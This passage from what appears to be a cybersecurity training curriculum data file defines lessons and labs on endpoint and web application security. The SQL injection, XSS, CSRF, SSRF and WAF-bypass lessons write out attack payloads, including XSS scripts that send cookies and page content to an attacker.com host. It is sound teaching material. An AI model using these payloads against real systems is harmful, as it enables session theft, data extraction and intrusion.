      LAB('ep-wl-lab1', 'Design Application Control Policy', 100, 'Your organization wants to implement application whitelisting. Users run: Microsoft Office, Chrome, Slack, Adobe Reader, a custom internal Python script, and some departmental legacy apps. Describe: your rule design (publisher vs path vs hash rules), how you handle the Python script, how you use audit mode before enforcement, and how you detect and respond to LOLBin abuse attempts like mshta.exe and regsvr32.exe.', ['AppLocker', 'WDAC', 'LOLBins', 'audit mode', 'publisher rule', 'mshta', 'PowerShell', 'application control']),
    ],
  },

  {
    id: 'ep-encryption',
    title: 'Endpoint Encryption',
    description: 'Implement full-disk encryption and file-level encryption to protect data at rest.',
    category: 'endpoint-security',
    difficulty: 'beginner',
    accentColor: '#34d399',
    modules: [
      L('ep-enc-l1', 'Disk & File Encryption at Rest', 75, `## Endpoint Encryption

Encryption at rest protects data when physical access is obtained — stolen laptops, decommissioned hardware, supply-chain attacks.

### Full Disk Encryption (FDE)
**BitLocker (Windows):** AES-128/256 encryption of the entire drive. Managed via Group Policy or Intune. Uses TPM chip to seal the encryption key — laptop must boot with the correct hardware profile.

**FileVault (macOS):** XTS-AES-128 encryption. Managed via MDM. Recovery key stored in Active Directory or MDM solution.

**LUKS (Linux):** Standard for Linux FDE. Often combined with TPM for automated unlock.

### TPM (Trusted Platform Module)
TPM stores the disk encryption key. If the boot environment changes (BIOS update, boot order change, removed drive), TPM refuses to release the key — data is protected even if the drive is removed.

**TPM 2.0** is required for Windows 11 and modern BitLocker features.

### Key Management
- Store recovery keys in Active Directory (BitLocker) or MDM
- Never store recovery keys on the encrypted device
- Test recovery process quarterly — not during a crisis

### Common Encryption Gaps
- USB drives not encrypted (VeraCrypt or BitLocker To Go)
- Email attachments containing sensitive data (S/MIME, PGP)
- Cloud sync bypassing encryption (data decrypted in cloud)
- Hibernation files containing memory (encrypt swapfile too)

### Compliance Requirements
HIPAA, GDPR, and PCI DSS all require encryption of sensitive data at rest. Unencrypted PII on a stolen laptop typically triggers breach notification.`),
      LAB('ep-enc-lab1', 'BitLocker Deployment Assessment', 100, 'An auditor reports that only 60% of your 400 laptops have BitLocker enabled, and recovery keys for 30 of them cannot be found. Design a remediation plan: how you identify unencrypted laptops at scale, how you deploy BitLocker via Intune/GPO without disrupting users, how you recover the missing keys or handle laptops with missing keys, and what processes prevent this gap in the future.', ['BitLocker', 'TPM', 'recovery key', 'Intune', 'Group Policy', 'FDE', 'compliance', 'audit']),
    ],
  },

  {
    id: 'ep-browser-security',
    title: 'Browser Security & Isolation',
    description: 'Harden browsers, block malicious extensions, and implement browser isolation for high-risk users.',
    category: 'endpoint-security',
    difficulty: 'beginner',
    accentColor: '#34d399',
    modules: [
      L('ep-browser-l1', 'Browser Attack Vectors & Hardening', 75, `## Browser Security & Isolation

The browser is the most common attack entry point — users spend most of their day in it. Drive-by downloads, malicious extensions, and credential phishing all target the browser.

### Browser Attack Categories
**Drive-by Downloads:** User visits a compromised website; malicious code exploits browser/plugin vulnerability to download malware silently.

**Malicious Extensions:** Browser extensions run with broad permissions. Malicious or compromised extensions can steal credentials, redirect traffic, and inject ads.

**Session Hijacking:** Stolen browser cookies allow account takeover without needing credentials. Especially dangerous on shared or infected machines.

**Credential Phishing:** Browser-in-the-Browser (BitB) attacks render fake browser windows inside a page, perfectly mimicking legitimate login forms.

### Browser Hardening Controls
- **Managed browser policies:** Google Admin/Intune to enforce settings at scale
- **Extension allowlisting:** Only permit specific approved extensions
- **Safe Browsing:** Enable Google Safe Browsing or Microsoft SmartScreen
- **Cookie security:** Enforce SameSite=Strict, secure, HttpOnly on internal apps
- **Password manager:** Enforce use of corporate password manager; disable built-in browser save

### Browser Isolation
Remote Browser Isolation (RBI) executes all browsing in a cloud container. Only pixels are sent to the user. Malware in the browser stays in the container.

Used for: high-risk users, access to unknown URLs, third-party contractor access.

### Certificate Pinning
Intercept and inspect HTTPS traffic with corporate proxy. Deploy corporate CA certificate to all endpoints. Detect malware using TLS for C2.`),
      LAB('ep-browser-lab1', 'Browser Extension Audit', 100, 'An employee browser audit reveals 23 extensions installed. Security audit finds one extension has access to read and change all data on websites visited and was last updated in 2019, and another is a cryptocurrency miner disguised as an ad blocker. Describe: how you audit browser extensions at scale across 500 users, your policy for approved extensions, how you detect malicious extension behavior, and how you respond to the cryptocurrency miner finding.', ['browser extension', 'malicious extension', 'allowlisting', 'browser isolation', 'HTTPS inspection', 'policy enforcement', 'crypto miner', 'session hijacking']),
    ],
  },

  {
    id: 'ep-fileless-malware',
    title: 'Fileless Malware Defense',
    description: 'Detect and prevent memory-resident attacks that leave no files on disk.',
    category: 'endpoint-security',
    difficulty: 'advanced',
    accentColor: '#34d399',
    modules: [
      L('ep-fileless-l1', 'Fileless Attack Techniques & Detection', 75, `## Fileless Malware Defense

Fileless malware runs entirely in memory, leaving no files on disk. Traditional antivirus based on file scanning is blind to it. It's used by APTs, ransomware groups, and sophisticated attackers.

### How Fileless Malware Works
1. Initial access via document macro, exploit, or malicious link
2. Shellcode injected into legitimate process memory (explorer.exe, svchost.exe)
3. PowerShell or WMI used to download and execute code in memory
4. Persistence via registry (fileless), WMI subscriptions, or scheduled tasks pointing to memory

### Common Techniques
**PowerShell Empire / Metasploit Meterpreter:** Fully in-memory frameworks. Payload downloaded and executed without touching disk.

**Process Hollowing:** Spawn a legitimate process (svchost.exe), replace its memory with malicious code. Process looks legitimate in task manager.

**Reflective DLL Injection:** Load a DLL into process memory without calling Windows loader. No file created; no registry entry.

**WMI Persistence:** Event subscription triggers PowerShell command on boot — no files, just WMI database entries.

### Detection Strategies
- **Memory scanning:** EDR agents scan process memory for shellcode patterns
- **Script block logging:** Log all PowerShell code executed, even obfuscated
- **AMSI (Antimalware Scan Interface):** Windows scans script content before execution
- **ETW (Event Tracing for Windows):** Low-level system telemetry for kernel-level activity
- **Behavioral detection:** Word.exe making network connections is suspicious regardless of payload

### Hardening Controls
- PowerShell v5+ only (has better logging than v2)
- Disable PowerShell v2 (used to bypass AMSI)
- Enable Script Block Logging via GPO
- Constrained Language Mode limits dangerous cmdlets`),
      LAB('ep-fileless-lab1', 'Detect Fileless PowerShell Attack', 100, 'PowerShell logs show: Invoke-Expression (IEX) with a base64-encoded string that decodes to a command downloading from a URL. The process tree shows powershell.exe as a child of winword.exe with no script file. Describe: what this attack chain indicates, how you decode and analyze the base64, what AMSI bypass technique may be in use, how you use memory forensics to extract the full payload, and how you prevent this class of attack.', ['fileless malware', 'PowerShell', 'AMSI', 'base64', 'IEX', 'process injection', 'Script Block Logging', 'memory forensics']),
    ],
  },

  {
    id: 'ep-threat-hunting-endpoint',
    title: 'Endpoint Threat Hunting',
    description: 'Proactively hunt for hidden threats on endpoints using behavioral analytics and hypotheses.',
    category: 'endpoint-security',
    difficulty: 'advanced',
    accentColor: '#34d399',
    modules: [
      L('ep-hunt-l1', 'Hypothesis-Driven Threat Hunting', 75, `## Endpoint Threat Hunting

Threat hunting is proactive — you search for hidden threats rather than waiting for alerts. It assumes the adversary is already inside and looks for subtle signs of their presence.

### Hunting vs. Incident Response
- **IR:** Reactive — alert fires, you investigate
- **Threat Hunting:** Proactive — hypothesis-driven search, often finds what alerts miss

### The Hunt Loop
1. **Hypothesis:** "I believe threat actor X is using WMI persistence on our endpoints"
2. **Data Collection:** Pull WMI subscription data from all endpoints via EDR
3. **Analysis:** Look for anomalies — subscriptions created recently, referencing unusual scripts
4. **Response:** If found, incident response. If not found, document null result and refine hypothesis.

### MITRE ATT&CK as Hunt Framework
Each technique in ATT&CK has data sources and detection suggestions. Use it to build a hunt plan:
- T1059.001 (PowerShell) → Hunt for encoded commands, unusual parent processes
- T1547.001 (Registry Run Keys) → Hunt for new Run keys pointing to temp paths
- T1003.001 (LSASS Dump) → Hunt for processes accessing LSASS memory

### Data Sources
- EDR process tree data
- Windows Event Log (4688 process creation, 4624/4625 logon)
- PowerShell Script Block Logs (Microsoft-Windows-PowerShell/Operational)
- Prefetch files (show what executed even if deleted)
- Sysmon (extended Windows telemetry)

### Metrics
Track: hunts completed, threats found, alert rules created from hunt findings, MTTD improvement.`),
      SIM('ep-hunt-sim1', 'Live Threat Hunt Simulation', 100, 'You are a threat hunter and receive intelligence that the FIN7 group has been targeting companies in your industry using a specific TTP: spearphishing with malicious Excel attachments, followed by WMI persistence and Cobalt Strike deployment. Walk through your complete hunt: your hypotheses, what data sources you query, what Sysmon events you look for, and how you escalate if you find indicators.'),
    ],
  },

  // ══════════════════════════════════════════════════
  // DOMAIN 3: WEB APPLICATION SECURITY  (10 courses)
  // ══════════════════════════════════════════════════

  {
    id: 'web-owasp-top10',
    title: 'OWASP Top 10 Deep Dive',
    description: 'Master the most critical web application security risks defined by OWASP.',
    category: 'web-app-security',
    difficulty: 'beginner',
    accentColor: '#f87171',
    modules: [
      L('web-owasp-l1', 'OWASP Top 10 Explained', 75, `## OWASP Top 10 Deep Dive

The OWASP Top 10 is the industry-standard list of the most critical web application security risks, updated every few years based on real-world data.

### 2021 Top 10 Overview
1. **A01 Broken Access Control** — Users access unauthorized functions or data (most common, was #5 in 2017)
2. **A02 Cryptographic Failures** — Sensitive data transmitted or stored without proper encryption
3. **A03 Injection** — SQL, LDAP, OS command injection via untrusted data
4. **A04 Insecure Design** — Flaws in design and architecture, not just implementation
5. **A05 Security Misconfiguration** — Missing hardening, default credentials, verbose error messages
6. **A06 Vulnerable & Outdated Components** — Libraries/frameworks with known CVEs
7. **A07 Identification & Auth Failures** — Weak passwords, no MFA, poor session management
8. **A08 Software & Data Integrity Failures** — Insecure CI/CD, unsigned updates, insecure deserialization
9. **A09 Security Logging Failures** — No audit trail for attacks, insufficient monitoring
10. **A10 SSRF** — Server tricked into making requests to internal resources

### Why It Matters
These 10 categories cover ~95% of web application vulnerabilities found in real penetration tests. Understanding them is mandatory for any developer, security engineer, or penetration tester.

Use the OWASP Testing Guide (OTG) for specific test cases for each category. Use the OWASP ASVS (Application Security Verification Standard) to verify your application meets security requirements.`),
      LAB('web-owasp-lab1', 'Identify OWASP Vulnerabilities in Code', 100, 'Review this code snippet: `query = "SELECT * FROM users WHERE username = \'" + username + "\' AND password = \'" + password + "\'"` executed directly against the database. Also: the app shows stack traces in error responses, uses MD5 for password hashing, and has no rate limiting on the login endpoint. Identify the OWASP category for each issue, the specific exploit that could be used, and the remediation.', ['SQL injection', 'parameterized query', 'MD5 password hash', 'bcrypt', 'rate limiting', 'error disclosure', 'OWASP Top 10', 'brute force']),
    ],
  },

  {
    id: 'web-sql-injection',
    title: 'SQL Injection — Attack & Defense',
    description: 'Understand SQL injection from both attacker and defender perspectives; implement parameterized queries.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-sqli-l1', 'SQL Injection Techniques & Prevention', 75, `## SQL Injection — Attack & Defense

SQL Injection remains one of the most damaging vulnerabilities in web applications. It allows attackers to read, modify, or delete database content.

### How SQLi Works
When user input is concatenated directly into SQL queries:
\`\`\`sql
-- Vulnerable code
SELECT * FROM users WHERE id = ' + userId + '

-- Attacker input: 1 OR 1=1--
-- Result: Returns ALL users
\`\`\`

### Types of SQL Injection
**Classic (In-Band):** Results returned directly in the response. Easy to exploit.

**Blind Boolean-Based:** No results shown, but behavior changes (true vs false). Attackers infer data bit by bit.

**Blind Time-Based:** No behavior change visible; attacker uses SLEEP() to infer true/false via response time.

**Out-of-Band:** Data exfiltrated via DNS or HTTP requests from the database server.

**Error-Based:** Database error messages reveal table names, column names, database version.

### Attack Payloads
\`\`\`sql
' OR '1'='1         -- Authentication bypass
' UNION SELECT username,password FROM users--  -- Data extraction
'; DROP TABLE users--  -- Destructive (rare in real attacks)
' AND SLEEP(5)--    -- Blind time-based
\`\`\`

### Prevention
**1. Parameterized Queries (Prepared Statements)** — The only reliable fix:
\`\`\`python
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
\`\`\`

**2. Stored Procedures** — Keep SQL in the database, not code

**3. ORM (Least privilege)** — SQLAlchemy, Hibernate abstract SQL safely

**4. Input validation** — Secondary control; never the only defense

**5. WAF** — Detects and blocks common SQLi patterns at the edge`),
      LAB('web-sqli-lab1', 'SQL Injection Code Review', 100, 'You find this code in a login function: `query = f"SELECT * FROM users WHERE email = \'{email}\' AND password = MD5(\'{password}\')"`. Write: the exact SQL injection payload to bypass authentication, a UNION-based payload to extract all email/password hashes, the corrected parameterized version in Python/Node.js, and explain why MD5 is insufficient for password storage even without SQL injection.', ['SQL injection', 'authentication bypass', 'UNION SELECT', 'parameterized query', 'MD5', 'bcrypt', 'prepared statement', 'ORM']),
    ],
  },

  {
    id: 'web-xss',
    title: 'Cross-Site Scripting (XSS)',
    description: 'Exploit and defend against reflected, stored, and DOM-based XSS vulnerabilities.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-xss-l1', 'XSS Types, Payloads & Content Security Policy', 75, `## Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users. The attack runs in the victim's browser — stealing cookies, redirecting to phishing pages, or capturing keystrokes.

### XSS Types
**Reflected XSS:** Malicious script in URL parameter; server reflects it in response. Requires tricking victim to click malicious URL.

**Stored XSS:** Malicious script saved to database (comment, profile field); executes for every user who views it. Most dangerous.

**DOM-Based XSS:** No server involvement; JavaScript reads URL and writes to DOM unsafely. Invisible in HTTP responses.

### Impact
- **Session hijacking:** \`document.cookie\` exfiltrated to attacker
- **Keylogger:** Capture all keystrokes on the page
- **Defacement:** Replace page content
- **Drive-by download:** Redirect to malware
- **CSRF bypass:** XSS bypasses CSRF token checks

### Payloads
\`\`\`html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com?d='+btoa(document.body.innerHTML))">
<svg onload="eval(atob('BASE64_ENCODED_PAYLOAD'))">
\`\`\`

### Prevention
**Output Encoding** — Encode all user-supplied data before rendering in HTML, JS, CSS, URL contexts.

**Content Security Policy (CSP)** — HTTP header restricting what scripts can execute:
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
\`\`\`

**Sanitization libraries** — DOMPurify for HTML, ESAPI for Java

**HTTPOnly cookies** — Prevents JavaScript from reading cookies`),
      LAB('web-xss-lab1', 'XSS Defense Audit', 100, 'A web app allows users to post comments that are displayed to all users. The comment field is not sanitized. Write: a stored XSS payload that steals session cookies and sends them to an attacker server, explain how HTTPOnly cookies would prevent cookie theft, write the Content Security Policy header that would mitigate this attack, and show how DOMPurify sanitization should be applied in JavaScript.', ['stored XSS', 'reflected XSS', 'Content Security Policy', 'HTTPOnly', 'DOMPurify', 'output encoding', 'session hijacking', 'cookie theft']),
    ],
  },

  {
    id: 'web-auth-sessions',
    title: 'Authentication & Session Security',
    description: 'Implement secure authentication, multi-factor auth, and session management patterns.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-auth-l1', 'Secure Auth & Session Management', 75, `## Authentication & Session Security

Authentication vulnerabilities are responsible for a huge portion of web breaches. Weak passwords, poor session management, and missing MFA create easy attack paths.

### Password Security
- Store with bcrypt (cost factor ≥ 12), Argon2id, or scrypt — never MD5/SHA1
- Enforce minimum length (12+), check against breach databases (HaveIBeenPwned API)
- Progressive lockout after failed attempts; alert user on suspicious logins

### Multi-Factor Authentication
- TOTP (Time-based One-Time Password): Google Authenticator, Authy — much better than SMS
- SMS 2FA is vulnerable to SIM swapping; avoid for high-value accounts
- Hardware keys (FIDO2/WebAuthn): phishing-resistant, gold standard
- Push notifications (Okta Verify, Duo): convenient but susceptible to MFA fatigue attacks

### Session Management
Sessions are the "keys to the kingdom" after authentication:

**Secure session tokens:**
- 128-bit minimum random value (not sequential, not predictable)
- Regenerate session ID on login (prevent session fixation)
- Expire sessions on logout and after inactivity (30-60 minutes)

**Secure cookie attributes:**
\`\`\`
Set-Cookie: session=TOKEN; Secure; HttpOnly; SameSite=Strict; Path=/
\`\`\`

**Session invalidation:**
- Server-side invalidation on logout (token blacklist or session store delete)
- Client-side "clear cookie" alone is insufficient

### JWT Security
JWTs used as session tokens must:
- Be signed (HS256/RS256) — never \`alg:none\`
- Have expiration (\`exp\` claim)
- Be revocable (blocklist or short expiry)
- Never contain sensitive data (base64 is not encryption)`),
      LAB('web-auth-lab1', 'Auth Security Code Review', 100, 'Review these findings: 1) Passwords stored as SHA1(password). 2) Session tokens are sequential integers. 3) Sessions never expire. 4) JWT verification code accepts alg=none. 5) SMS 2FA used for admin accounts. For each finding: explain the attack that exploits it, give the CVSS score level, and provide the corrected implementation code or configuration.', ['bcrypt', 'session fixation', 'JWT alg none', 'SIM swapping', 'FIDO2', 'session expiration', 'MFA fatigue', 'TOTP']),
    ],
  },

  {
    id: 'web-api-security',
    title: 'API Security Fundamentals',
    description: 'Secure REST and GraphQL APIs against OWASP API Top 10 attack categories.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-api-l1', 'OWASP API Top 10 & Defense', 75, `## API Security Fundamentals

APIs are the backbone of modern applications — and increasingly the attack surface of choice. The OWASP API Security Top 10 defines the most critical API risks.

### OWASP API Security Top 10 (2023)
1. **Broken Object Level Authorization (BOLA):** Access another user's objects by manipulating IDs (\`/api/orders/12345\` → change to \`/api/orders/12346\`)
2. **Broken Authentication:** Weak API keys, missing token expiration
3. **Broken Object Property Level Auth:** API returns all object fields including privileged ones
4. **Unrestricted Resource Consumption:** No rate limiting; expensive operations called in bulk
5. **Broken Function Level Auth:** Non-admin users call admin endpoints
6. **Unrestricted Access to Sensitive Business Flows:** Scraping, account creation bots
7. **SSRF:** API fetches attacker-controlled URLs
8. **Security Misconfiguration:** Debug endpoints exposed, CORS misconfiguration
9. **Improper Inventory Management:** Outdated/shadow API versions accessible
10. **Unsafe Consumption of APIs:** Trusting third-party API responses

### Key Defenses
**BOLA Prevention:** Never rely on client-supplied IDs alone. Verify the authenticated user owns the requested object.

**Rate Limiting:** Per-user, per-IP, per-endpoint limits. Return 429 with Retry-After header.

**Input Validation:** Validate request schemas strictly. Reject unknown fields.

**API Gateway:** Centralize auth, rate limiting, logging. Ensure all APIs route through it.

**Versioning:** Deprecate and remove old API versions. Attackers target v1 when v3 is hardened.`),
      LAB('web-api-lab1', 'Find BOLA in an API', 100, 'Testing a REST API: GET /api/v1/users/1001/profile returns your profile. Changing to /api/v1/users/1002/profile returns another user\'s SSN and salary. POST /api/v1/admin/reset-passwords works even with a regular user token. Describe: the OWASP API categories for each finding, the business impact, the server-side authorization check that prevents BOLA, and how you would implement function-level authorization middleware.', ['BOLA', 'OWASP API', 'broken access control', 'rate limiting', 'API gateway', 'authorization middleware', 'object-level auth', 'function-level auth']),
    ],
  },

  {
    id: 'web-csrf-clickjacking',
    title: 'CSRF & Clickjacking Defense',
    description: 'Understand Cross-Site Request Forgery and UI redressing attacks; implement modern defenses.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-csrf-l1', 'CSRF and Clickjacking Mechanics & Mitigations', 75, `## CSRF & Clickjacking Defense

### Cross-Site Request Forgery (CSRF)
CSRF tricks an authenticated user's browser into making unauthorized requests to a target application. The browser automatically includes session cookies — the server cannot tell a legitimate request from a forged one.

**Example Attack:**
\`\`\`html
<!-- Attacker's page visited by logged-in bank user -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
\`\`\`

The bank's server sees a valid session cookie and executes the transfer.

**CSRF Defenses:**
1. **SameSite Cookie:** \`SameSite=Strict\` — cookies not sent on cross-site requests. Breaks CSRF for most modern browsers.
2. **CSRF Token:** Random token in form + session; server validates match. Attackers can't read the token due to Same-Origin Policy.
3. **Double Submit Cookie:** Token in cookie + request body; compare server-side.
4. **Custom Headers:** Ajax requests with custom header (X-Requested-With) — not sendable cross-origin by default.

**Note:** SameSite=Strict is now the primary defense; CSRF tokens are additional defense in depth.

### Clickjacking (UI Redressing)
Attacker overlays a transparent iframe of a target site over a fake page. Victim clicks what they think is the fake page but actually interacts with the target.

**Defenses:**
- **X-Frame-Options:** \`DENY\` or \`SAMEORIGIN\` header prevents framing
- **Content-Security-Policy frame-ancestors:** \`CSP: frame-ancestors 'none'\` — modern equivalent, more flexible
- **Frame busting JS:** Breaks out of frames (unreliable; use HTTP headers instead)`),
      LAB('web-csrf-lab1', 'CSRF Token Implementation', 100, 'An e-commerce site has no CSRF protection on the payment endpoint POST /api/checkout. Write: the CSRF attack HTML that would make an authenticated user submit a payment to an attacker account, explain why SameSite=Strict would prevent this, implement a CSRF token middleware in Express.js that generates and validates tokens, and explain when CSRF tokens are still needed even with SameSite cookies.', ['CSRF token', 'SameSite', 'Same-Origin Policy', 'X-Frame-Options', 'clickjacking', 'double submit', 'CORS', 'iframe']),
    ],
  },

  {
    id: 'web-waf',
    title: 'Web Application Firewalls',
    description: 'Deploy, configure, and tune WAFs to block OWASP attacks without blocking legitimate traffic.',
    category: 'web-app-security',
    difficulty: 'intermediate',
    accentColor: '#f87171',
    modules: [
      L('web-waf-l1', 'WAF Architecture, Rules & Bypass Techniques', 75, `## Web Application Firewalls

A WAF inspects HTTP/HTTPS traffic between users and web applications, blocking known attack patterns. It's a critical defense layer but not a complete solution.

### WAF Deployment Modes
**Reverse Proxy (Inline):** WAF sits in the traffic path. Can block attacks in real-time. Introduces latency. Most common.

**Out-of-Band (Mirror):** Traffic mirrored to WAF for analysis. Cannot block; only alerts. Zero latency impact.

**Cloud-Based WAF:** Cloudflare, AWS WAF, Akamai. Easy deployment, globally distributed, DDoS protection included.

**On-Premise:** F5 ASM, Imperva. Full control, high performance, complex to manage.

### Rule Categories
- **Signature-based:** Match known attack strings (XSS vectors, SQLi patterns)
- **Positive security model:** Define what's allowed; block everything else
- **Rate limiting:** Requests per second per IP/endpoint
- **Bot detection:** Challenge suspicious user agents, behavioral analysis

### WAF Bypass Techniques (Know Your Enemy)
- **Encoding:** URL encode, double URL encode, HTML entity encode attack characters
- **Case variation:** \`<ScRiPt>\`, \`sElEcT\`
- **Comment insertion:** \`SEL/**/ECT\` (MySQL ignores comments)
- **Alternate syntax:** \`CHAR(83,69,76)\` instead of \`SEL\`
- **HTTP Parameter Pollution:** Duplicate parameters confuse WAF vs app

### Tuning Approach
Start in detection mode. Identify false positives. Add exceptions for legitimate traffic patterns. Gradually tighten rules. Never go straight to blocking mode — you will break production.`),
      LAB('web-waf-lab1', 'WAF Rule Tuning Exercise', 100, 'Your WAF is blocking legitimate requests: a search function sending apostrophes in product names, and a medical app sending HTML in patient notes. At the same time, a penetration tester bypassed the WAF using Unicode encoding. Describe: how you create WAF exceptions for legitimate apostrophes without creating SQLi bypass, how you safely allow HTML input with DOMPurify instead of a WAF exception, and how you update WAF rules to catch Unicode-encoded SQLi.', ['WAF exception', 'false positive', 'Unicode encoding', 'DOMPurify', 'WAF bypass', 'positive security model', 'detection mode', 'SQLi']),
    ],
  },

  {
    id: 'web-secure-coding',
    title: 'Secure Coding Principles',
    description: 'Write secure code by default using SSDLC principles, threat modeling, and code review.',
    category: 'web-app-security',
    difficulty: 'beginner',
    accentColor: '#f87171',
    modules: [
      L('web-code-l1', 'Secure SDLC & Developer Security', 75, `## Secure Coding Principles

Security built into the development process costs 10× less than security bolted on afterwards. The Secure Software Development Lifecycle (SSDLC) integrates security at every stage.

### SSDLC Phases
| Phase | Security Activity |
|-------|------------------|
| Requirements | Security requirements, compliance mapping |
| Design | Threat modeling (STRIDE), architecture review |
| Implementation | Secure coding standards, peer review, SAST |
| Testing | DAST, penetration testing, dependency scanning |
| Deployment | Security configuration, secrets scanning |
| Maintenance | Patch management, vulnerability monitoring |

### Core Secure Coding Principles
**Validate Input:** All data from external sources is untrusted. Validate type, length, format, range. Reject-then-sanitize is safer than sanitize-then-allow.

**Encode Output:** Context-aware encoding prevents injection. HTML encode for HTML context; SQL parameterize for SQL context.

**Principle of Least Privilege:** Code runs with minimum permissions needed. Database user can only SELECT/INSERT — not DROP TABLE.

**Defense in Depth:** Multiple security controls. A bypassed WAF shouldn't be the only thing stopping SQLi.

**Fail Securely:** Default to deny. On error, don't leak sensitive information. Log the error; show user a generic message.

**Don't Roll Your Own Crypto:** Use established libraries (OpenSSL, libsodium). Never implement AES, RSA, or hashing yourself.

### Threat Modeling with STRIDE
- **S**poofing — Authentication controls
- **T**ampering — Integrity controls
- **R**epudiation — Audit logging
- **I**nformation Disclosure — Encryption, access controls
- **D**enial of Service — Rate limiting, resource controls
- **E**levation of Privilege — Authorization controls`),
      LAB('web-code-lab1', 'Threat Model a Login Feature', 100, 'Using STRIDE, threat model a web application login feature. For each STRIDE category: identify at least one specific threat (e.g., for Spoofing: attacker brute-forces credentials), the mitigating control (rate limiting + MFA), and how you would test the control is working. Also describe what security requirements you would write for this feature before any code is written.', ['STRIDE', 'threat modeling', 'brute force', 'rate limiting', 'MFA', 'SSDLC', 'security requirements', 'least privilege']),
    ],
  },

  {
    id: 'web-ssrf',
    title: 'Server-Side Request Forgery (SSRF)',
    description: 'Detect and exploit SSRF to access cloud metadata, internal services, and internal networks.',
    category: 'web-app-security',
    difficulty: 'advanced',
    accentColor: '#f87171',
    modules: [
      L('web-ssrf-l1', 'SSRF Attack Vectors & Cloud Metadata', 75, `## Server-Side Request Forgery (SSRF)

SSRF tricks a server into making HTTP requests to unintended locations — most dangerously, internal services and cloud instance metadata endpoints.

### How SSRF Works
A web app fetches a URL provided by the user:
\`\`\`
https://app.com/fetch?url=https://example.com/image.png
\`\`\`

Attacker changes to:
\`\`\`
https://app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

The server (running on AWS EC2) fetches the cloud metadata endpoint and returns AWS credentials.

### High-Value SSRF Targets
**AWS IMDSv1:** \`http://169.254.169.254/latest/meta-data/\` — exposes instance role credentials
**GCP:** \`http://metadata.google.internal/computeMetadata/v1/\`
**Azure:** \`http://169.254.169.254/metadata/instance\`
**Internal Services:** Redis on localhost:6379, Elasticsearch on :9200, Kubernetes API on :6443

### Blind SSRF
Server makes the request but doesn't return the response. Detect with:
- Collaborator/Burp interactsh — captures out-of-band DNS/HTTP requests
- Timing differences (internal services respond faster)

### Defense
1. **IMDSv2 on AWS** — Requires PUT with TTL header; SSRF via GET cannot get metadata
2. **Allowlist valid domains** — Only allow fetching from expected sources
3. **Block internal IP ranges** — Reject 10.x, 172.16.x, 192.168.x, 127.x, 169.254.x
4. **Disable unnecessary URL fetch features**
5. **Network-level controls** — Servers making outbound requests should not reach internal networks`),
      LAB('web-ssrf-lab1', 'SSRF Exploitation Lab', 100, 'A web app has a "thumbnail preview" feature that fetches a user-supplied URL. You discover you can fetch http://localhost:8080/admin (internal admin panel). Describe: how you enumerate internal services using SSRF, what you look for at cloud metadata endpoints, how IMDSv2 would have prevented the AWS credential theft, and the code-level fix (allowlist validation) plus network-level fix (egress firewall rules) for this vulnerability.', ['SSRF', 'cloud metadata', 'IMDSv2', 'internal service', 'allowlist', 'egress filtering', 'blind SSRF', 'Kubernetes API']),
    ],
  },

  {
    id: 'web-pen-testing',
    title: 'Web Application Penetration Testing',
    description: 'Conduct structured web app pentests using Burp Suite and OWASP methodology.',
    category: 'web-app-security',
    difficulty: 'advanced',
    accentColor: '#f87171',
    modules: [
      L('web-pentest-l1', 'Web App Pentest Methodology', 75, `## Web Application Penetration Testing

Penetration testing systematically finds vulnerabilities before attackers do. A structured methodology ensures coverage and reproducibility.

### Pentest Phases (OWASP Testing Guide)
1. **Reconnaissance:** Enumerate subdomains, directories, technologies, parameters
2. **Configuration Testing:** Check security headers, TLS config, admin interfaces
3. **Identity & Auth Testing:** Test password policies, session management, MFA
4. **Authorization Testing:** BOLA, privilege escalation, IDOR
5. **Input Validation:** SQLi, XSS, SSRF, file upload, deserialization
6. **Business Logic:** Multi-step process bypasses, price manipulation
7. **Cryptography:** Weak algorithms, improper certificate validation

### Burp Suite Workflow
**Proxy:** Intercept and modify all HTTP traffic
**Scanner:** Automated vulnerability detection
**Repeater:** Manually replay and modify requests
**Intruder:** Fuzzing and brute force
**Collaborator:** Out-of-band detection (blind SSRF, blind XSS)
**Decoder:** Encode/decode payloads

### Recon Tools
- **ffuf / dirsearch:** Directory and file fuzzing
- **nuclei:** Template-based vulnerability scanning
- **sqlmap:** Automated SQL injection detection
- **Amass / subfinder:** Subdomain enumeration

### Report Writing
Great finding reports include:
1. **Title** — Clear, specific
2. **Severity** — CVSS score
3. **Description** — What the vulnerability is
4. **Steps to Reproduce** — Exact steps a developer can follow
5. **Evidence** — Screenshots, HTTP requests
6. **Business Impact** — What an attacker gains
7. **Remediation** — Specific fix`),
      SIM('web-pentest-sim1', 'Pentest Findings Debrief', 100, 'You just completed a web app pentest and found: SQLi in the search function, stored XSS in user profiles, IDOR allowing access to other users\' orders, and no MFA on admin accounts. The development team is defensive and dismisses some findings as "theoretical." You are presenting to the CISO. Make your case for each vulnerability, quantify the business risk, and propose a remediation timeline.'),
    ],
  },

  // ══════════════════════════════════════════════════
  // DOMAIN 4: CLOUD SECURITY  (10 courses)
  // ══════════════════════════════════════════════════

  {
    id: 'cloud-shared-responsibility',
    title: 'Cloud Shared Responsibility Model',
    description: 'Understand who is responsible for what in AWS, Azure, and GCP cloud environments.',
    category: 'cloud-security',
    difficulty: 'beginner',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-shared-l1', 'Shared Responsibility & Cloud Security Fundamentals', 75, `## Cloud Shared Responsibility Model

The most important concept in cloud security: the cloud provider and the customer share security responsibilities. Misunderstanding this boundary is the root cause of most cloud breaches.

### AWS Shared Responsibility
**AWS is responsible for:** Physical data centers, hardware, hypervisor, network infrastructure, global infrastructure security.

